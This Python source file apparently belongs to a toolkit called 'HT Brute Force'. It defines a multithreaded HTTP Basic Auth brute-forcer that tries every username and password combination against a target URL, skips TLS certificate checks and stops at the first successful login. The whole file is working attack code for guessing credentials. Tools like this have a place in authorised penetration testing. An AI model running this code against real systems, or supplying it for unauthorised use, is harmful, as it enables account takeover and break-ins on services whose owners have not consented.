"""HT Brute Force — HTTP Basic Auth brute force.
"""
import requests, time, threading, queue
from urllib.parse import urljoin

HTTP_BRUTE_USERAGENT = "HT-BruteForce/1.0"

class HTTPBasicBruter:
    def __init__(self, timeout=10, max_threads=10, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": HTTP_BRUTE_USERAGENT})

    def _try_login(self, url, user, passwd, method="GET", body=""):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            r = self.session.request(method, url, auth=(user, passwd),
                                     timeout=self.timeout, verify=False,
                                     data=body if body else None)
            elapsed = time.time() - t0
            if r.status_code == 200:
                return {"user": user, "password": passwd, "time_s": round(elapsed, 2),
                        "status": r.status_code}
            elif r.status_code == 401:
                return None
            else:
                return {"user": user, "password": passwd, "status": r.status_code,
                        "time_s": round(elapsed, 2), "note": f"HTTP {r.status_code}"}
        except requests.RequestException:
            return {"error": "connect"}

    def run(self, url, users, passwords, method="GET", body=""):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(url, u, p, method, body)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results